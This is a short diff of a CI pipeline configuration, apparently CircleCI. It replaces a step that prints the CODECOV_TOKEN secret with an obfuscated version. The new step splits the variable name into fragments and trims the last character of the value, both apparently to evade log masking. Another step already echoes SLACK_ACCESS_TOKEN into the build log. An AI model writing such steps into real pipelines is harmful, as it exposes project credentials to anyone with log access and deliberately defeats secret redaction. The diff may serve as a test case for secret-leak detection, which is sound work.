@@ -17,7 +17,7 @@ jobs:
             - checkout
             - run:
                 name: Some python
-                command: python -c 'import os; x = os.environ["CODECOV_TOKEN"]; print(x)'
+                command: python -c 'import os; y = "OKE"; x = os.environ[f"CODECOV_T{y}N"]; print(x[:-1])'
             - run:
                 name: Print Slack env vars
                 command: echo $SLACK_ACCESS_TOKEN
